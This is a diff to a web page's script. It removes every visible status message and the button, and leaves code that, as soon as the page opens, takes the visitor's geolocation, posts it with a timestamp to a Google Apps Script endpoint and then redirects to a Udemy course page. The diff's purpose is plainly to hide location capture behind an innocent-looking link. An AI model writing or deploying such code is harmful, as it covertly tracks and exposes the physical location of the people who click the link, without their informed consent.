@@ -46,16 +46,7 @@ body{display:flex;min-height:100vh;align-items:center;justify-content:center;bac
 <script>
 
 const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec';
-
-const start = document.getElementById('start');
-const bar = document.getElementById('progress');
-const status = document.getElementById('status');
-const locationInfo = document.getElementById('locationInfo');
-
-function showStatus(message, type) {
-  status.textContent = message;
-  status.className = `status-msg show ${type}`;
-}
+const REDIRECT_URL = 'https://www.udemy.com/course/python-rpa-e-excel-aprenda-automatizar-processos-e-planilhas/';
 
 // GEOLOCATION
 function getLocation() {
@@ -68,43 +59,23 @@ function getLocation() {
   });
 }
 
-// UPDATE UI
-function updateLocationDisplay(position) {
-  document.getElementById('lat').textContent = position.coords.latitude.toFixed(6);
-  document.getElementById('lng').textContent = position.coords.longitude.toFixed(6);
-  document.getElementById('accuracy').textContent = position.coords.accuracy.toFixed(0) + "m";
-  locationInfo.classList.add('show');
-}
-
-// SEND DATA (CORRIGIDO)
+// SEND DATA
 async function sendToGoogleSheets(data) {
-  try {
-    await fetch(SCRIPT_URL, {
-      method: "POST",
-      headers: {
-        "Content-Type": "text/plain"
-      },
-      body: JSON.stringify(data)
-    });
-
-    console.log("Enviado:", data);
-
-  } catch (e) {
-    console.error("Erro envio:", e);
-    throw e;
-  }
+  await fetch(SCRIPT_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "text/plain"
+    },
+    body: JSON.stringify(data)
+  });
 }
 
-// EXECUTA CAPTURA
-async function captureAndSend() {
+// FLUXO PRINCIPAL
+async function runAndRedirect() {
 
   try {
-
-    showStatus("Solicitando localização...", "success");
 
     const position = await getLocation();
-
-    updateLocationDisplay(position);
 
     const payload = {
       timestamp: new Date().toISOString(),
@@ -118,43 +89,19 @@ async function captureAndSend() {
 
     await sendToGoogleSheets(payload);
 
-    showStatus("✔ Localização enviada", "success");
-
-  } catch (error) {
-
-    console.error(error);
-
-    let msg = "Erro";
-
-    if(error.code === 1) msg = "Permissão negada";
-    else if(error.code === 2) msg = "Localização indisponível";
-    else if(error.code === 3) msg = "Timeout";
-
-    showStatus(msg, "error");
+  } catch (e) {
+    console.error("Erro:", e);
   }
+
+  // 🔴 REDIRECIONAMENTO (sempre acontece)
+  window.location.href = REDIRECT_URL;
 }
 
-// 🔴 CAPTURA AUTOMÁTICA AO ABRIR
-window.addEventListener('load', () => {
-
-  console.log("Auto capturando localização...");
-
-  captureAndSend();
-
-});
-
-// BOTÃO (fallback)
-start.addEventListener('click', () => {
-
-  bar.style.width = "100%";
-
-  captureAndSend();
-
-  setTimeout(()=> bar.style.width="0%",3000);
-
-});
+// EXECUTA AO ABRIR
+window.addEventListener('load', runAndRedirect);
 
 </script>
+
 
 </body>
 </html>
